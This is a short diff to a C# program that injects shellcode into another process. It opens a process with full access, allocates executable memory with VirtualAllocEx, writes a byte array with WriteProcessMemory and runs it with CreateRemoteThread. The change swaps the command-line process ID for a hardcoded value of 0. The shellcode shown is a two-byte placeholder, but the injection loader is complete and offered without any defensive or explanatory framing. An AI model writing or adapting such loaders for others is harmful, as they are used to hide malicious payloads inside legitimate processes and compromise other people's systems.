@@ -25,13 +25,14 @@ class Program
 
     static byte[] shellcode = new byte[] {0xbb,0x34};
 
-    static void Main(string[] args)
+    static void Main()
     {
+        int processId = 0;
         UIntPtr bytesWritten = UIntPtr.Zero;
         uint shellcode_size = (uint)shellcode.Length;
         IntPtr lpThreadId = IntPtr.Zero;
 
-        IntPtr h_process = OpenProcess(PROCESS_ALL_ACCESS, false, int.Parse(args[0]));
+        IntPtr h_process = OpenProcess(PROCESS_ALL_ACCESS, false, processId);
         IntPtr b_shellcode = VirtualAllocEx(h_process, IntPtr.Zero, shellcode_size, (uint)MEM_RESERVE | (uint)MEM_COMMIT, (uint)PAGE_EXECUTE_READWRITE);
         WriteProcessMemory(h_process, b_shellcode, shellcode, shellcode_size, out bytesWritten);
         IntPtr h_thread = CreateRemoteThread(h_process, IntPtr.Zero, 0, b_shellcode, IntPtr.Zero, 0, lpThreadId);
